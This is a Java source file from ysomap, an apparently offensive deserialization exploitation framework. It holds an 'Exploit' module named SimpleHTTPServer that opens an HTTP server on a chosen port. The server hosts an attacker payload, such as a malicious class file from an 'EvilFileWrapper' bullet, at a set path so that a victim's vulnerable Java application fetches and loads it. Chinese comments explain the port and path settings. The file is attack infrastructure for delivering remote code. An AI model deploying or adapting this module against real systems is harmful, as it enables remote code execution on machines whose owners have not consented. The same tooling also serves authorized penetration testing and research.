package ysomap.core.exploit.http;

import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;
import ysomap.common.annotation.*;
import ysomap.core.bean.Exploit;
import ysomap.core.util.HTTPHelper;
import ysomap.common.util.Logger;

import java.util.LinkedHashMap;
import java.util.Map;


/**
 * @author wh1t3P1g
 * @since 2020/2/18
 */
@Exploits
@Authors({Authors.WH1T3P1G})
@Require(bullets = {"EvilFileWrapper"})
@Dependencies({"need to set a payload"})
public class SimpleHTTPServer extends Exploit {

//    @NotNull
//    @Require(name = "lhost", detail = "current host to listen")
//    private String lhost = null;
    @NotNull
    @Require(name = "lport", type = "int", detail = "监听端口")
    private String lport = null;

    @NotNull
    @Require(name = "path", detail = "设置uri路径, 如/<classname>.class，这里的classname必须和bullet里面的classname相同")
    private String path = null;

    @NotNull
    private Object payload;
    private String payloadName;

    private HttpServer server;

    @Override
    public void work() {
        needRunning = true;
        int p = Integer.parseInt(lport);
        if(!path.startsWith("/")){
            path = "/"+path;
        }
//        String codebase = "http://"+lhost+":"+lport+"/";
        try {// 创建class和jar文件的挂载
            Map<String, HttpHandler> paths = new LinkedHashMap<>();
            paths.put(path, new HTTPHelper.PayloadHandler((byte[]) payload));

            server = HTTPHelper.makeSimpleHTTPServer(p, paths);
            server.start();
            Logger.success("Opening Payload HTTPServer on " + lport);
            Logger.success("Paths "+path);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void stop() {
        if(server != null){
            server.stop(0);
            Logger.success("SimpleHTTPServer stopped");
        }
        exit = true;
        needRunning = false;
    }

    @Override
    public String toString() {
        return "SimpleHTTPServer{" +
                "lport='" + lport + '\'' +
                ", path='" + path + '\'' +
                ", payloadName='" + payloadName + '\'' +
                '}';
    }
}
